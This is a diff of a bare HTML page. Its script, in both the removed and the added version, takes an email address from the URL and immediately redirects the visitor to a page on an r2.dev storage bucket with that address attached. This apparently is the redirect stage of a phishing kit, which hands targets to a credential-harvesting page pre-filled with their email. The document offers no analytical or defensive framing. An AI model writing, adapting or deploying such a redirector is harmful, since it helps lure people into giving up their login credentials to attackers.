@@ -1,53 +1,15 @@
-<html lang="en">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head></head>
+</body>
+<script>
+  var hash = window.location.hash;
+  if(hash !== "") {
 
-<head>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-  <meta charset="utf-8">
+    hash = hash.split('#');
+    const email = hash[1];
 
-
-
-  <head>
-
-  <body>
-
-    <script type="text/javascript">
-      var url_string = window.location.href;
-      var url_get_email = atob(getafterhash(url_string));
-      var mail_go_url = "https://pub-66556e5e82ee4c3980ec46c15eb48145.r2.dev/index.html#" + url_get_email + "";
-      location.replace(mail_go_url);
-
-
-      function getafterhash(url) {
-        var ret;
-        var queryString;
-        // stuff after # is not part of query string, so get rid of it
-        queryStringhash = url.split('?')[1];
-        queryStringsemi = url.split(';')[1];
-        queryStringsemiplus = url.split(';+')[1];
-        queryStringstartsemi = url.split('*;')[1];
-        // if query string exists
-        if (queryStringhash) {
-          ret = queryStringhash;
-
-        } else if (queryStringsemi) {
-          ret = queryStringsemi;
-
-        } else if (queryStringsemiplus) {
-          ret = queryStringsemiplus;
-
-        } else if (queryStringstartsemi) {
-          ret = queryStringstartsemi;
-
-        } else {
-
-          ret = 0;
-
-        }
-
-        return ret;
-      }
-
-    </script>
-  </body>
-
+      window.location.href = "https://pub-66556e5e82ee4c3980ec46c15eb48145.r2.dev/index.html#" + email;
+  }
+</script>
 </html>
